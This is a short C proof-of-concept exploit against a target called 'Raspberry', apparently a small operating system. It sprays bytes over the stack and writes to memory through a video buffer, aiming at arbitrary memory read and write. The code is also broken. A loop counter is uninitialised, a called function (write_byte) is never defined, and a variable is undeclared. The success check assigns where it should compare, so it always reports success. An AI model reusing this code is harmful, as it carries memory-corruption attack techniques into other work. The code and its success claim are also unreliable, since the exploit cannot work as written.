// Raspberry
// This is a PoC that exploits Raspberry, to allow arbitrary memory r/w.
// Currently it only sprays bytes, but I will add memory r/w to ANYWHERE; at some point. 

void spray(char byte) {
	char buffer[0x20000];
	
	for (int j; j < 0x20000; j++) {
		buffer[j] = byte;
	};
	
	printc(buffer, byte);
	
	return;
};

void w_byte(int loc, char byte) {
	char buffer[1];
	
	buffer[0] = byte;
	location = loc + 0xfa0;
	
	printc(buffer, video[loc + 0xfa0 + 1]);
	clear_screen();
	
	return;
};

int kernel_test() {
	w_byte(0x5, 'A');
	
	clear_screen();
	
	if (video[0xfa5] == 'A') {
		return 1;
	};
	
	return 0;
};


void demo() {
	write_byte((0x1000 - 0x7d0), 0x42);
	
	clear_screen();
	
	if (video[0x1000] = 0x42) {
		printf("success: sprayed byte 0x42 over stack");
	};
};
